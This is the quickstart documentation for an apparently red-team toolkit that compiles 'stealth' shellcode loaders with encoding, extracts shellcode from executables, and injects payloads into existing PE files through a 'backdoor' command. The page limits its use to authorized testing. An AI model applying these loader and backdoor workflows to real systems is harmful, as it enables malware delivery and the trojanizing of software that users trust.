---
outline: deep
---

# Quickstart

This guide walks through installing Washmachine, validating the runtime environment, and executing your first CLI workflows.

::: tip After completing this page you will have
- A working build of the full solution (CLI + GUI + Core)
- A validated CLI runtime with compiler discovery
- A provisioned Bin2Shell integration (optional)
- Familiarity with output artifacts, session logs, and the interactive REPL
:::

## Requirements

### CLI (`washmachine-cli`)

| Component | Version | Notes |
|---|---|---|
| OS | Windows 10 1809+ / Windows 11 | x64 only |
| .NET | 8.0 Runtime x64 | Required for CLI execution |
| C++ Compiler | MSVC, MinGW-w64 `g++`, or `clang++` | At least one must be discoverable |
| Python | 3.10+ | Required only for Bin2Shell features (encoding/envelope) |

### Desktop application (`washmachine`)

| Component | Version | Notes |
|---|---|---|
| OS | Windows 10 1809+ / Windows 11 | x64 only |
| .NET | 8.0 Desktop Runtime x64 | Required for WinUI 3 |
| Windows App SDK | 1.8 Runtime | Mica backdrop, NavigationView |
| C++ Compiler | MSVC, MinGW-w64 `g++`, or `clang++` | At least one must be discoverable |
| Python | 3.10+ | Required only for Bin2Shell features |

### Compiler support

The build system auto-discovers compilers in this order:

1. Environment variables (`VCToolsInstallDir`, `VCINSTALLDIR`)
2. Visual Studio installations (2017–2022, all editions)
3. System PATH (`cl.exe`, `g++.exe`, `clang++.exe`)

Run `washmachine-cli list compilers` to verify which toolchains are available.

## 1) Clone and build the solution

```powershell
git clone https://github.com/0xhmza/washmachine.git
cd washmachine
dotnet build washmachine.sln
```

The solution builds three projects:

| Project | Output |
|---|---|
| `Washmachine.Core` | Shared class library (dependency of CLI and GUI) |
| `Washmachine.Cli` | `Output/cli/Debug/net8.0/washmachine-cli.exe` |
| `washmachine` | `Output/Debug/net8.0-windows10.0.19041.0/washmachine.exe` |

::: tip Build scripts
Use the included build script for convenience:
```powershell
.\build.ps1                    # Build Debug
.\build.ps1 -Config Release   # Build Release
.\build.ps1 -Launch           # Build and launch GUI
```
:::

## 2) Validate command availability

```powershell
washmachine-cli --help
```

Verify the runtime catalog and compiler discovery:

```powershell
# List available templates from the YAML catalog
washmachine-cli list templates

# List discovered C++ compilers
washmachine-cli list compilers

# List snippet sections and their defaults
washmachine-cli list snippets
```

::: tip Interactive REPL
Launch `washmachine-cli` without arguments to enter the interactive shell with tab completion, command history, and sub-shells for each command.
:::

## 3) Execute core CLI workflows

### Compile a loader

```powershell
# Minimal loader from a shellcode file
washmachine-cli compile -s payload.bin

# Full-featured loader with the default template
washmachine-cli compile -s payload.bin -t default

# Stealth loader with encoding and envelope
washmachine-cli compile -s payload.bin -t stealth -e 1 -v 2

# Compile from inline hex
washmachine-cli compile --shellcode-hex FC4883E4F0...

# JSON output for CI/CD pipelines
washmachine-cli compile -s payload.bin --json
```

### Analyze a PE file

```powershell
# Full analysis dashboard (headers, sections, imports, code caves, security score)
washmachine-cli analyze target.exe

# JSON output for downstream processing
washmachine-cli analyze target.exe --json
```

### Extract shellcode from a PE

```powershell
# Default: entry point to end of .text section
washmachine-cli strip loader.exe

# Extract a named section
washmachine-cli strip loader.exe -m section --section .text -o payload.bin

# Analyze extraction targets without extracting
washmachine-cli strip loader.exe --analyze
```

### Inject shellcode into a PE

```powershell
# Code-cave injection (default method)
washmachine-cli backdoor --pe target.exe -s payload.bin

# New section method with custom output path
washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section -o patched.exe

# Dry run — analyze feasibility without modifying
washmachine-cli backdoor --pe target.exe -s payload.bin --dry-run
```

## 4) Provision Bin2Shell integration (optional)

Bin2Shell provides encoding and envelope capabilities for payload transformation. Provision it before using `--encoder` or `--envelope` options:

```powershell
washmachine-cli provision
```

This downloads the Bin2Shell Python tool from GitHub and installs it to `Tools/Bin2Shell/`. Verify the installation:

```powershell
# List available encoders and envelopes
washmachine-cli list encoders
```

The desktop application can also invoke provisioning automatically when encoding features are requested.

## 5) Verify output locations

After running compile or backdoor commands, artifacts are written to these locations:

| Path | Content |
|---|---|
| `temp/cpp/Compiled Binaries/` | Named output binaries (`YYYYMMDD_HHMMSS-<hash>.exe`) |
| `logging/session_<timestamp>_<guid>/source.cpp` | Final rendered C++ source code |
| `logging/session_<timestamp>_<guid>/build_log.txt` | Compiler stdout/stderr capture |
| `logging/backdoor_<timestamp>_<guid>/log.txt` | Full backdoor operation audit trail |
| `test_results.json` | Test harness summary |

## 6) Run the test harness (optional)

Validate your setup by running the automated test suite:

```powershell
# Run all test phases
washmachine-cli test --shellcode messagebox.bin --phase all

# Run encoder/envelope combinations only
washmachine-cli test --shellcode messagebox.bin --phase 1

# Run template/snippet permutations
washmachine-cli test --shellcode messagebox.bin --phase 2

# Run multi-shellcode testing
washmachine-cli test --phase 3 --test-assets "testing assets/binary/shellcodes"
```

Test phases:

| Phase | Coverage |
|---|---|
| **1** | All encoder × envelope × web helper combinations |
| **2** | All template × snippet permutations |
| **3** | Multiple shellcode input files |

## Continue

- [CLI Reference](/cli-reference) — complete command-level options and argument contracts
- [Architecture](/architecture) — internal service flow, pipeline stages, and catalog format
- [Bin2Shell](/bin2shell) — encoder/envelope implementation details and data contracts

::: warning ⚠️ Security Notice
This toolkit is intended **exclusively** for educational and authorized security testing purposes.
:::
